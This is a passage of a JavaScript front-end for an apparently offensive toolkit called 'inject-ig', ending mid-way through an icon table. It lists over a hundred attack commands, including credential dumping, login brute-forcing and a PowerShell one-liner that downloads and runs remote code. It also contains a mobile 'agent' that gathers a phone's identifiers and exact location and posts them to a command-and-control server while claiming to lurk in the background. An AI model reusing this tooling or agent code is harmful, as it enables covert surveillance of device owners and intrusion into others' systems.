const SERVER_URL = 'http://localhost:8080'; // CHANGE THIS TO YOUR CLOUD SERVER URL (e.g. https://api.yoursite.com)

// ═══════ Polyfill: AbortSignal.timeout (não existe no Electron antigo no Linux) ═══════
if (!AbortSignal.timeout) {
    AbortSignal.timeout = (ms) => {
        const controller = new AbortController();
        setTimeout(() => controller.abort(new DOMException('TimeoutError', 'TimeoutError')), ms);
        return controller.signal;
    };
}

// ═══════════ Terminal Initialization ═══════════
// ── Global Sound Effects ──
document.addEventListener('mouseover', (e) => {
    if (e.target.closest('button') || e.target.closest('.seg-btn') || e.target.closest('.card')) {
        if (window.SoundEngine) window.SoundEngine.play('hover');
    }
});

document.addEventListener('mousedown', (e) => {
    if (e.target.closest('button') || e.target.closest('.seg-btn') || e.target.closest('.item')) {
        if (window.SoundEngine) window.SoundEngine.play('click');
    }
});

document.addEventListener('keydown', (e) => {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        if (window.SoundEngine) window.SoundEngine.play('keystroke');
    }
});

const term = new window.Terminal({
    cursorBlink: true,
    cursorStyle: 'bar',
    fontFamily: "'Geist Mono', 'SF Mono', monospace",
    fontSize: 12,
    lineHeight: 1.45,
    disableStdin: true,
    theme: {
        background: '#08090c',
        foreground: '#e8eaed',
        cursor: '#3b82f6',
        selectionBackground: 'rgba(59,130,246,0.15)',
        black: '#0c0e13',
        brightBlack: '#454d5a',
        green: '#22c55e',
        brightGreen: '#22c55e',
        red: '#ef4444',
        brightRed: '#ef4444',
        blue: '#3b82f6',
        brightBlue: '#3b82f6',
        yellow: '#f59e0b',
        brightYellow: '#f59e0b',
        cyan: '#06b6d4',
        brightCyan: '#06b6d4'
    }
});

const fitAddon = new window.FitAddon.FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById('terminal-container'));
fitAddon.fit();

term.prompt = () => {
    term.write('\r\n\x1b[32mnexus\x1b[0m@\x1b[34mcore\x1b[0m:~$ ');
};

let commandBuffer = '';
let currentVaultData = {};

// ═══════════ Audio UX Engine ═══════════
const RendererAudioEngine = {
    ctx: null,
    init() {
        if (!this.ctx) this.ctx = new (window.AudioContext || window.webkitAudioContext)();
    },
    playClick() {
        if (!this.ctx) return;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(800, this.ctx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(300, this.ctx.currentTime + 0.05);
        gain.gain.setValueAtTime(0.1, this.ctx.currentTime);
        gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start();
        osc.stop(this.ctx.currentTime + 0.05);
    },
    playAlert() {
        if (!this.ctx) return;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'sawtooth';
        osc.frequency.setValueAtTime(150, this.ctx.currentTime);
        osc.frequency.linearRampToValueAtTime(100, this.ctx.currentTime + 0.3);
        gain.gain.setValueAtTime(0.2, this.ctx.currentTime);
        gain.gain.linearRampToValueAtTime(0, this.ctx.currentTime + 0.3);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start();
        osc.stop(this.ctx.currentTime + 0.3);
    }
};

document.body.addEventListener('click', () => {
    RendererAudioEngine.init();
    RendererAudioEngine.playClick();
});

term.writeln('\x1b[90m───────────────────────\x1b[0m');
term.writeln('  \x1b[1minject-ig\x1b[0m  \x1b[90mTerminal (Modo Leitura)\x1b[0m');
term.writeln('\x1b[90m───────────────────────\x1b[0m');
term.writeln('\x1b[90m[Entrada de comandos desativada. Apenas para logs.]\x1b[0m');
term.writeln('');

// ═══════════ Navigation Logic ═══════════
const segBtns = document.querySelectorAll('.seg-btn[data-target]');
const views = document.querySelectorAll('.view');

segBtns.forEach(btn => {
    btn.addEventListener('click', () => {
        const targetId = btn.getAttribute('data-target');
        if (!targetId) return;
        
        segBtns.forEach(b => b.classList.remove('active'));
        views.forEach(v => {
            v.classList.remove('active');
            v.style.display = 'none';
        });
        
        btn.classList.add('active');
        const targetView = document.getElementById(targetId);
        if (targetView) {
            targetView.classList.add('active');
            targetView.style.display = targetId === 'view-terminal' ? 'flex' : 'flex'; // Ensure flex for all views
        }
        
        if (targetId === 'view-terminal') setTimeout(() => fitAddon.fit(), 10);
        if (targetId === 'view-tools') renderTools();
        if (targetId === 'view-exploits') renderExploits();
        if (targetId === 'view-settings') {
            if (typeof loadLicenseSettings === 'function') loadLicenseSettings();
        }
        if (targetId === 'view-agent-ig') {
            if (typeof loadAgentIgHistory === 'function') loadAgentIgHistory();
        }
    });
});

// Navbar Sub-Tabs
const showSubPane = (tabId) => {
    const panes = {
        'tab-data': 'pane-data',
        'tab-files': 'pane-files',
        'tab-monitor': 'pane-monitor'
    };
    document.querySelectorAll('#view-vault .sub-seg-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('pane-data').style.display = 'none';
    document.getElementById('pane-files').style.display = 'none';
    document.getElementById('pane-monitor').style.display = 'none';
    
    const btn = document.getElementById(tabId);
    if (btn) btn.classList.add('active');
    
    const paneId = panes[tabId];
    const pane = document.getElementById(paneId);
    if (pane) pane.style.display = 'flex';
};

document.getElementById('tab-data')?.addEventListener('click', () => showSubPane('tab-data'));
document.getElementById('tab-files')?.addEventListener('click', () => showSubPane('tab-files'));
document.getElementById('tab-monitor')?.addEventListener('click', () => {
    showSubPane('tab-monitor');
    setTimeout(() => { if (typeof resizeCanvas === 'function') resizeCanvas(); }, 50);
});

// Tools Sub-Tabs
const showToolsPane = (tabId) => {
    document.querySelectorAll('#view-tools .sub-seg-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('pane-tools-catalog').style.display = 'none';
    document.getElementById('pane-tools-results').style.display = 'none';
    
    const btn = document.getElementById(tabId);
    if (btn) btn.classList.add('active');
    
    const paneId = tabId.replace('tab-', 'pane-');
    const pane = document.getElementById(paneId);
    if (pane) {
        pane.style.display = 'flex';
        if (tabId === 'tab-tools-catalog') renderTools();
    }
};

document.getElementById('tab-tools-catalog')?.addEventListener('click', () => showToolsPane('tab-tools-catalog'));
document.getElementById('tab-tools-results')?.addEventListener('click', () => showToolsPane('tab-tools-results'));

const showSubPaneExploits = (tabId) => {
    document.querySelectorAll('#view-exploits .sub-seg-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('pane-exploits-catalog').style.display = 'none';
    document.getElementById('pane-exploits-results').style.display = 'none';
    
    const btn = document.getElementById(tabId);
    if (btn) btn.classList.add('active');
    
    const paneId = tabId.replace('tab-', 'pane-');
    const pane = document.getElementById(paneId);
    if (pane) {
        pane.style.display = 'flex';
        if (tabId === 'tab-exploits-catalog') renderExploits();
    }
};

document.getElementById('tab-exploits-catalog')?.addEventListener('click', () => showSubPaneExploits('tab-exploits-catalog'));
document.getElementById('tab-exploits-results')?.addEventListener('click', () => showSubPaneExploits('tab-exploits-results'));

// ═══════════ Terminal Commands (100+) ═══════════
const TERMINAL_COMMANDS = [
    { cat: 'OSINT', cmd: 'ig whois {target}', desc: 'Domínio/IP registration' },
    { cat: 'OSINT', cmd: 'ig dig {target} ANY', desc: 'Full DNS records' },
    { cat: 'OSINT', cmd: 'ig nslookup -type=mx {target}', desc: 'Mail servers' },
    { cat: 'OSINT', cmd: 'ig dnsrecon -d {target}', desc: 'DNS enumeration' },
    { cat: 'OSINT', cmd: 'ig subfinder -d {target}', desc: 'Passive subdomains' },
    { cat: 'OSINT', cmd: 'ig assetfinder {target}', desc: 'Find related domains' },
    { cat: 'OSINT', cmd: 'ig amass enum -d {target}', desc: 'Active DNS discovery' },
    { cat: 'OSINT', cmd: 'ig theHarvester -d {target} -b all', desc: 'Email/Host scraper' },
    { cat: 'OSINT', cmd: 'ig sherlock {user}', desc: 'Social media search' },
    { cat: 'OSINT', cmd: 'ig waybackurls {target}', desc: 'Historical URL list' },
    { cat: 'OSINT', cmd: 'ig gau {target}', desc: 'Get All URLs' },
    { cat: 'OSINT', cmd: 'ig shodan search {target}', desc: 'IoT search engine' },
    { cat: 'OSINT', cmd: 'ig censys search {target}', desc: 'Attack surface map' },
    { cat: 'OSINT', cmd: 'ig zoomeye search {target}', desc: 'Global device scan' },
    { cat: 'OSINT', cmd: 'ig dmitry -iwnse {target}', desc: 'Host intelligence' },
    { cat: 'OSINT', cmd: 'ig spiderfoot -s {target}', desc: 'Automation recon' },
    { cat: 'OSINT', cmd: 'ig recon-ng', desc: 'Reconnaissance framework' },
    { cat: 'OSINT', cmd: 'ig photon -u {target}', desc: 'Fast crawler' },
    { cat: 'OSINT', cmd: 'ig infoga -d {target}', desc: 'Email info gathering' },
    { cat: 'OSINT', cmd: 'ig finalrecon --url {target}', desc: 'All-in-one recon' },

    { cat: 'WEB', cmd: 'ig whatweb {target}', desc: 'Technology stack' },
    { cat: 'WEB', cmd: 'ig wafw00f {target}', desc: 'Identify WAF/CDN' },
    { cat: 'WEB', cmd: 'ig nikto -h {target}', desc: 'Vulnerability scan' },
    { cat: 'WEB', cmd: 'ig wpscan --url {target}', desc: 'WordPress scanner' },
    { cat: 'WEB', cmd: 'ig joomscan -u {target}', desc: 'Joomla scanner' },
    { cat: 'WEB', cmd: 'ig droopescan scan drupal -u {target}', desc: 'Drupal scanner' },
    { cat: 'WEB', cmd: 'ig cmseek -u {target}', desc: 'CMS detection' },
    { cat: 'WEB', cmd: 'ig sqlmap -u "{url}" --batch', desc: 'SQL Injection' },
    { cat: 'WEB', cmd: 'ig commix --url "{url}"', desc: 'Command Injection' },
    { cat: 'WEB', cmd: 'ig xsstrike -u {target}', desc: 'Advanced XSS scan' },
    { cat: 'WEB', cmd: 'ig dalfox url {target}', desc: 'XSS scanner' },
    { cat: 'WEB', cmd: 'ig ffuf -u {url}/FUZZ -w {wordlist}', desc: 'Fuzzing' },
    { cat: 'WEB', cmd: 'ig gobuster dir -u {target} -w {wordlist}', desc: 'Directory brute' },
    { cat: 'WEB', cmd: 'ig dirsearch -u {target}', desc: 'Dir/File search' },
    { cat: 'WEB', cmd: 'ig feroxbuster -u {target}', desc: 'Recursion crawler' },
    { cat: 'WEB', cmd: 'ig nuclei -u {target}', desc: 'Template based scan' },
    { cat: 'WEB', cmd: 'ig arjun -u {url}', desc: 'Parameter discovery' },
    { cat: 'WEB', cmd: 'ig paramspider -d {target}', desc: 'Find parameters' },
    { cat: 'WEB', cmd: 'ig linkfinder -i {url}', desc: 'JS link scraper' },
    { cat: 'WEB', cmd: 'ig secretfinder -i {url}', desc: 'Sensitive data in JS' },

    { cat: 'NET', cmd: 'ig nmap -sV -sC {target}', desc: 'Standard scan' },
    { cat: 'NET', cmd: 'ig nmap -p- {target}', desc: 'Scan all 65k ports' },
    { cat: 'NET', cmd: 'ig masscan {target} -p1-65535', desc: 'Ultra fast scan' },
    { cat: 'NET', cmd: 'ig rustscan -a {target}', desc: 'Modern fast scanner' },
    { cat: 'NET', cmd: 'ig netdiscover -r {range}', desc: 'L2 discovery' },
    { cat: 'NET', cmd: 'ig arp-scan -l', desc: 'Local network scan' },
    { cat: 'NET', cmd: 'ig bettercap', desc: 'MITM/Network tool' },
    { cat: 'NET', cmd: 'ig responder -I eth0', desc: 'LLMNR/NBT-NS poison' },
    { cat: 'NET', cmd: 'ig tshark -i eth0', desc: 'Terminal Wireshark' },
    { cat: 'NET', cmd: 'ig tcpdump -i eth0', desc: 'Packet capture' },
    { cat: 'NET', cmd: 'ig hping3 -S {target}', desc: 'Custom TCP packets' },
    { cat: 'NET', cmd: 'ig scapy', desc: 'Packet manipulation' },
    { cat: 'NET', cmd: 'ig massdns -r resolvers.txt {target}', desc: 'Fast DNS' },
    { cat: 'NET', cmd: 'ig enum4linux {target}', desc: 'SMB enumeration' },
    { cat: 'NET', cmd: 'ig smbmap -H {target}', desc: 'SMB share scan' },
    { cat: 'NET', cmd: 'ig snmp-check {target}', desc: 'SNMP enumeration' },
    { cat: 'NET', cmd: 'ig onesixtyone {target}', desc: 'SNMP brute' },
    { cat: 'NET', cmd: 'ig ike-scan {target}', desc: 'VPN/IPsec discovery' },
    { cat: 'NET', cmd: 'ig fierce --domain {target}', desc: 'DNS mapper' },
    { cat: 'NET', cmd: 'ig dnsenum {target}', desc: 'DNS brute' },

    { cat: 'VULN', cmd: 'ig msfconsole', desc: 'Metasploit Framework' },
    { cat: 'VULN', cmd: 'ig searchsploit {name}', desc: 'Search ExploitDB' },
    { cat: 'VULN', cmd: 'ig beef-xss', desc: 'Browser Exploitation' },
    { cat: 'VULN', cmd: 'ig routersploit', desc: 'Embedded exploits' },
    { cat: 'VULN', cmd: 'ig crackmapexec smb {target}', desc: 'Network post-exploit' },
    { cat: 'VULN', cmd: 'ig impacket-psexec {target}', desc: 'Remote shell' },
    { cat: 'VULN', cmd: 'ig evil-winrm -i {target}', desc: 'WinRM shell' },
    { cat: 'VULN', cmd: 'ig hydra -l {user} -P {pass} {target} {proto}', desc: 'Login brute' },
    { cat: 'VULN', cmd: 'ig medusa -h {target} -u {user} -P {pass}', desc: 'Parallel login brute' },
    { cat: 'VULN', cmd: 'ig ncrack {target}', desc: 'Network auth brute' },
    { cat: 'VULN', cmd: 'ig hashcat -m 0 {hash} {wordlist}', desc: 'GPU hash cracking' },
    { cat: 'VULN', cmd: 'ig john {file}', desc: 'John the Ripper' },
    { cat: 'VULN', cmd: 'ig steghide extract -sf {file}', desc: 'Steganography' },
    { cat: 'VULN', cmd: 'ig binwalk -e {file}', desc: 'Firmware analysis' },
    { cat: 'VULN', cmd: 'ig fcrackzip -u -D -p {list} {file}', desc: 'ZIP cracker' },
    { cat: 'VULN', cmd: 'ig mimikatz', desc: 'Windows credential tool' },
    { cat: 'VULN', cmd: 'ig bloodhound', desc: 'AD attack paths' },
    { cat: 'VULN', cmd: 'ig mitmproxy', desc: 'HTTP intercepting' },
    { cat: 'VULN', cmd: 'ig sslstrip', desc: 'SSL stripping' },
    { cat: 'VULN', cmd: 'ig proxychains nmap {target}', desc: 'Scan via proxy' },

    { cat: 'CLOUD', cmd: 'ig s3_scan {target}', desc: 'AWS S3 bucket' },
    { cat: 'CLOUD', cmd: 'ig az account list', desc: 'Azure accounts' },
    { cat: 'CLOUD', cmd: 'ig gcloud auth list', desc: 'GCP authentication' },
    { cat: 'CLOUD', cmd: 'ig kubectl get pods', desc: 'K8s cluster' },
    { cat: 'CLOUD', cmd: 'ig docker images', desc: 'Docker assets' },
    { cat: 'CLOUD', cmd: 'ig s3scanner --bucket {name}', desc: 'Scan open buckets' },
    { cat: 'CLOUD', cmd: 'ig cloud-enum -k {keyword}', desc: 'Enumerate resources' },
    { cat: 'CLOUD', cmd: 'ig trufflehog {url}', desc: 'Find secrets in Git' },
    { cat: 'CLOUD', cmd: 'ig gitleaks detect', desc: 'Scan repo for keys' },
    { cat: 'CLOUD', cmd: 'ig pacu', desc: 'AWS exploit framework' },

    { cat: 'SYS', cmd: 'ig lynis audit system', desc: 'Security auditing' },
    { cat: 'SYS', cmd: 'ig chkrootkit', desc: 'Check for rootkits' },
    { cat: 'SYS', cmd: 'ig rkhunter --check', desc: 'Rootkit hunter' },
    { cat: 'SYS', cmd: 'ig tiger', desc: 'Security scanner' },
    { cat: 'SYS', cmd: 'ig pspy', desc: 'Process monitor' },
    { cat: 'SYS', cmd: 'ig linpeas', desc: 'Linux privilege escalation' },
    { cat: 'SYS', cmd: 'ig winpeas', desc: 'Windows privilege escalation' },
    { cat: 'SYS', cmd: 'ig lsof -i', desc: 'Check open ports' },
    { cat: 'SYS', cmd: 'ig netstat -antp', desc: 'Active connections' },
    { cat: 'SYS', cmd: 'ig htop', desc: 'Process viewer' },

    { cat: 'UTILS', cmd: 'ig base64 {file}', desc: 'Base64 encode/decode' },
    { cat: 'UTILS', cmd: 'ig openssl enc -aes-256-cbc', desc: 'Encryption' },
    { cat: 'UTILS', cmd: 'ig gpg -c {file}', desc: 'GPG encryption' },
    { cat: 'UTILS', cmd: 'ig curl -I {url}', desc: 'Fetch headers' },
    { cat: 'UTILS', cmd: 'ig wget -m {url}', desc: 'Mirror website' },
    { cat: 'UTILS', cmd: 'ig jq . {file}', desc: 'JSON processor' },
    { cat: 'UTILS', cmd: 'ig awk \'{print $1}\' {file}', desc: 'Text processor' },
    { cat: 'UTILS', cmd: 'ig sed \'s/old/new/g\' {file}', desc: 'Stream editor' },
    { cat: 'UTILS', cmd: 'ig grep -r "{text}" .', desc: 'Recursive search' },
    { cat: 'UTILS', cmd: 'ig strings {binary}', desc: 'Find strings' },

    { cat: 'AD', cmd: 'ig secretsdump {target}', desc: 'Dump NT hashes' },
    { cat: 'AD', cmd: 'powershell "IEX (New-Object Net.WebClient).DownloadString(\'{url}\')"', desc: 'PS One-liner' },
    { cat: 'AD', cmd: 'ig winrm_brute {target}', desc: 'WinRM brute' },
    { cat: 'AD', cmd: 'ig sam_dump {target}', desc: 'SAM dump' },
    { cat: 'AD', cmd: 'ig rpc_enum {target}', desc: 'RPC enumeration' },
    { cat: 'AD', cmd: 'ig kerbrute {domain}', desc: 'User enumeration' },
    { cat: 'AD', cmd: 'ig sharpview {target}', desc: 'AD reconnaissance' },
    { cat: 'AD', cmd: 'ig rubeus {target}', desc: 'Kerberos tickets' },
    
    // EXTRA (To reach 110+)
    { cat: 'CLOUD', cmd: 'ig s3_scan {target}', desc: 'S3 bucket scanner' },
    { cat: 'OSINT', cmd: 'ig reverse_dns {target}', desc: 'Reverse DNS lookup' },
    { cat: 'OSINT', cmd: 'ig asn_lookup {target}', desc: 'ASN organization info' },
    { cat: 'NET', cmd: 'ig port_scan {target}', desc: 'Fast port scanner' },
    { cat: 'VULN', cmd: 'ig log4j_test {target}', desc: 'Log4Shell scanner' },
    { cat: 'VULN', cmd: 'ig heartbleed {target}', desc: 'Heartbleed checker' },
    { cat: 'VULN', cmd: 'ig shellshock {target}', desc: 'Shellshock checker' },
    { cat: 'VULN', cmd: 'ig ssl_audit {target}', desc: 'Full SSL audit' }
];

function renderTerminalCommands(filter = '') {
    const list = document.getElementById('cmd-list');
    if (!list) return;
    list.innerHTML = '';
    const filtered = TERMINAL_COMMANDS.filter(c => 
        c.cmd.toLowerCase().includes(filter.toLowerCase()) || 
        c.desc.toLowerCase().includes(filter.toLowerCase()) ||
        c.cat.toLowerCase().includes(filter.toLowerCase())
    );
    filtered.forEach(c => {
        const item = document.createElement('div');
        item.style.padding = '8px';
        item.style.borderRadius = '8px';
        item.style.background = 'rgba(255,255,255,0.03)';
        item.style.cursor = 'pointer';
        item.style.border = '1px solid rgba(255,255,255,0.05)';
        item.style.transition = 'all 0.2s cubic-bezier(0.4, 0, 0.2, 1)';
        item.style.marginBottom = '4px';
        item.innerHTML = `
            <div style="display:flex; justify-content: space-between; align-items: center; margin-bottom: 2px;">
                <span style="font-size: 8px; font-weight: 700; color: var(--accent); text-transform: uppercase; letter-spacing: 0.05em;">${c.cat}</span>
                <span style="font-size: 8px; color: var(--text-3); font-family: var(--mono);">cli</span>
            </div>
            <div style="font-family: var(--mono); font-size: 10px; color: var(--text-1); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; margin-bottom: 2px;">${c.cmd}</div>
            <div style="font-size: 8.5px; color: var(--text-3); line-height: 1.2;">${c.desc}</div>
        `;
        item.onmouseenter = () => {
            item.style.background = 'rgba(255,255,255,0.06)';
            item.style.borderColor = 'var(--accent)';
            item.style.transform = 'translateY(-1px)';
        };
        item.onmouseleave = () => {
            item.style.background = 'rgba(255,255,255,0.03)';
            item.style.borderColor = 'rgba(255,255,255,0.05)';
            item.style.transform = 'translateY(0)';
        };
        item.onclick = () => {
            const url = document.getElementById('scan-target').value || 'alvo.com';
            let finalCmd = c.cmd.replace(/{target}/g, url).replace(/{url}/g, url).replace(/{user}/g, 'admin').replace(/{pass}/g, '123456');
            term.write(finalCmd);
            commandBuffer = finalCmd;
            if (typeof RendererAudioEngine !== 'undefined') RendererAudioEngine.playClick();
        };
        list.appendChild(item);
    });
}

document.getElementById('cmd-search')?.addEventListener('input', (e) => renderTerminalCommands(e.target.value));
renderTerminalCommands();

// ═══════════ Icons ═══════════
// ════════════════════════════════════════════════════════════
// CAPACITOR NATIVE AGENT (SIDELOAD)
// ════════════════════════════════════════════════════════════
if (window.Capacitor && window.Capacitor.isNativePlatform()) {
    // Esconde UI de Desktop e mostra UI do Agente
    document.querySelector('.app').style.display = 'none';
    document.getElementById('agent-ui').style.display = 'flex';
    
    const logBox = document.getElementById('agent-log');
    const log = (msg) => {
        const time = new Date().toLocaleTimeString();
        logBox.innerHTML += `<div>[${time}] ${msg}</div>`;
        logBox.scrollTop = logBox.scrollHeight;
    };
    
    const startAgent = async () => {
        log('Capacitor Framework Inicializado');
        
        try {
            const { Device } = Capacitor.Plugins;
            const { Network } = Capacitor.Plugins;
            const { Geolocation } = Capacitor.Plugins;
            
            log('Iniciando extração de telemetria...');
            
            const info = await Device.getInfo();
            const battery = await Device.getBatteryInfo();
            const netStatus = await Network.getStatus();
            
            const payload = {
                device: info.model,
                os: info.operatingSystem + " " + info.osVersion,
                uuid: info.identifier,
                manufacturer: info.manufacturer,
                isVirtual: info.isVirtual,
                battery: battery.batteryLevel ? Math.round(battery.batteryLevel * 100) + '%' : 'Unknown',
                charging: battery.isCharging,
                network: netStatus.connectionType,
                connected: netStatus.connected
            };
            
            log('Hardware mapeado: ' + info.model);
            log('Bateria e Rede interceptados');
            
            try {
                log('Tentando extrair Geolocation...');
                const pos = await Geolocation.getCurrentPosition();
                payload.latitude = pos.coords.latitude;
                payload.longitude = pos.coords.longitude;
                log('Localização exata obtida.');
            } catch (e) {
                log('Erro Geolocation (Permissão Negada).');
            }
            
            log('Tentando conexão com o C2...');
            
            // Note: O IP hardcoded deve ser trocado pelo IP real da maquina rodando o Core Engine
            // Para fim de teste local/demo, pode ser 192.168.X.X, mas no mundo real o inject-ig deveria
            // injetar a URL do motor no arquivo env ou algo assim. 
            // Vamos usar o host do window.location ou tentar broadcast na sub-rede.
            // Por hora assumimos um C2 na cloud ou local pra demo.
            const HOST = "http://192.168.1.100:8080"; // Apenas um placeholder.
            
            try {
                await fetch(HOST + "/api/mobile/recon", {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                log('Dados transmitidos ao Motor Principal.');
                document.getElementById('agent-status').textContent = "Conexão C2 Estabelecida. Espreitando em background.";
            } catch (e) {
                log('Falha ao conectar ao servidor C2 (' + HOST + ')');
                document.getElementById('agent-status').textContent = "Operando Offline. Tentando novamente...";
            }
            
        } catch (e) {
            log('Erro no módulo de extração: ' + e.message);
        }
    };
    
    startAgent();
}

// ════════════════════════════════════════════════════════════
// ELECTRON / DESKTOP LOGIC
// ════════════════════════════════════════════════════════════
const ICONS = {
    search: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>',
    globe: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="2" y1="12" x2="22" y2="12"></line><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path></svg>',
    users: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>',
    mail: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>',
    shield: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>',
    shieldAlert: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>',
    lock: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>',
    unlock: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 9.9-1"></path></svg>',
    code: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>',
    settings: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>',
    file: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg>',
    activity: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"></polyline></svg>',
    server: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"></rect><rect x="2" y="14" width="20" height="8" rx="2" ry="2"></rect><line x1="6" y1="6" x2="6.01" y2="6"></line><line x1="6" y1="18" x2="6.01" y2="18"></line></svg>',
    smartphone: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>',
    database: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"></ellipse><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"></path><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"></path></svg>',
    link: '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>',
